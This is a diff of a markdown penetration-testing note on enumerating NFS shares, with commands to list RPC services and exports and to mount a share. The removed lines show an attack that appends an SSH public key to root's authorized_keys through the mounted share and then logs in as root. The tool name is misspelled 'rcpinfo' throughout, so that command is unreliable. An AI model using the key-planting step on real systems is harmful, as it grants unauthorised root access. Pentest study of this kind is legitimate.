@@ -1,27 +1,22 @@
 # NFS Enumeration
-Network file system
+Enumerating the Network file system.
 
-## Exploiting NFS
+## 1. Get Services
+Use rcpinfo to determine the services running
+```sh
+rcpinfo -p 192.168.1.1
+```
 
-1. Use rcpinfo to determine the services running
-`rcpinfo -p 192.168.1.1`
+## 2. Get Shares
+Use showmount to list which directories you have access to mount.
+```sh
+showmount -e 192.168.1.1
+```
 
-2. Use showmount to list which directories you have access to mount.
-`showmount -e 192.168.1.1`
-
-3. Create and mount the remote directory
+## 3. Mount Share
+Create a directory on your device and mount the remote share.
 ```sh
 mkdir /mnt/nfs
-mount /mnt/nfs
-```
-
-4. We notice that SSH is open, so we'll exploit that service. 
-```sh
-ssh-keygen
-cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
-```
-
-5. At this point we can ssh into the system as the root user.
-```sh
-ssh root@192.168.1.1
+mount -t nfs 10.10.10.10:sharename /mnt/nfs
+cd /mnt/nfs
 ```
